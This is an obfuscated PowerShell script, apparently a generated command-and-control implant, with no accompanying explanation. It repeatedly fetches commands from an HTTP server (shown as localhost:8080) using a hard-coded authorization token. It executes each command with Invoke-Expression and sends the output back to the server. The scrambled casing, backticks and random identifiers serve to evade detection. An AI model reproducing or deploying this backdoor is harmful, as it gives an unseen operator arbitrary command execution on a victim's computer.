
    $oaiyGO = n`EW-`oB`jEC`T micrOsoFt.POWershell.COmmanDs.webrEQuEstSeSSiON
        $hnUHLR = n`EW-`oB`jEC`T SySTem.NET.cookIE     
        
    FUNcTIOn gwMNwu {
        
        $FIqEIq = InVoke-weBrEQuest "http://localhost:8080/getcommand/ccEcQJ" -Headers @{"Authorization"="1332"}  
        rEtURN $FIqEIq.CONTENT 
    }
    FUNcTIOn jpLOHE([string]$iSmtIW){
        $iSmtIW  =(iex $iSmtIW 2>&1 | Out-String )
        rEtURN $iSmtIW
    }
    FUNcTIOn xCGGBI([string]$command){
    

        $OQVPJG = @{TawBIL=$command}
        $req = InVoke-weBrEQuest "http://localhost:8080/response/mskd" -Headers @{"Authorization"="1332"} -Method POST -Body $OQVPJG 
    }
    $AFIboj = 1
    
    WhiLe ($AFIboj -Le 5 -AND $AFIboj -nE 3)
    {
        $iSmtIW = gwMNwu
        if($iSmtIW.Trim() -Eq "none"){
        Start-S`lEep -s 1
    
        }
        ELSe{
        $iSmtIW = jpLOHE($iSmtIW)
        xCGGBI($iSmtIW)
    
        }
        
        Start-S`lEep -s 1
    }
    